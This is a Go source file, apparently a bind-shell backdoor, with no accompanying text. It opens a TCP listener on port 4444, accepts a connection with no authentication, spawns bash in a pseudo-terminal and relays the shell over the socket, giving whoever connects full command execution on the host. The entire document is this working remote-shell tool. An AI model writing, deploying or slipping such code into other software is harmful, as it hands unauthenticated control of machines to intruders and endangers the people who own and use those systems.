package main
import (
 "net"
 "io"
 "os/exec"
 "github.com/creack/pty"
)
func main() {
 listener, _ := net.Listen("tcp", ":4444")
 conn, _ := listener.Accept()
 terminal, _ := pty.Start(exec.Command("bash"))
 go io.Copy(conn, terminal)
 io.Copy(terminal, conn)
}
